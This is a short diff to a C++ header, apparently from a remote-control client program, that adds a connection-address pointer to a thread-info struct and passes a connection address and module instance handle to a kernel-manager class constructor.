@@ -21,13 +21,16 @@ struct ThreadInfo
 	HANDLE h;
 	IOCPClient *p;
 	void* user;
-	ThreadInfo() : run(TRUE), h(NULL), p(NULL), user(nullptr){ }
+	CONNECT_ADDRESS* conn;
+	ThreadInfo() : run(TRUE), h(NULL), p(NULL), user(nullptr), conn(nullptr){ }
 };
 
 class CKernelManager : public CManager  
 {
 public:
-	CKernelManager(IOCPClient* ClientObject);
+	CONNECT_ADDRESS* m_conn;
+	HINSTANCE m_hInstance;
+	CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance);
 	virtual ~CKernelManager();
 	VOID OnReceive(PBYTE szBuffer, ULONG ulLength);
 
